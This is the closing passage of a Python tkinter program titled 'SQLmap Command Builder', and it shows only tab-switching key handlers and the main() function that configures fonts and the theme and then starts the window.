    def alt_key_e(self, *args):
        return self.nRoot.select(tab_id=2)

    def help__f1(self, *args):
        return self.nRoot.select(tab_id=3)


# -----------------------------------------
def main():
    root = tkinter.Tk()
    f = font.Font(family='Helvetica', size=8, weight='bold')
    font.families()
    s = tkinter.ttk.Style()
    s.theme_use('clam')
    s.configure('.', font=f)
    root.title("SQLmap Command Builder")
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    root.resizable(False, False)
    appl = MainApplication(mw=root)
    appl.mainloop()


# -----------------------------------------
if __name__ == '__main__':
    main()
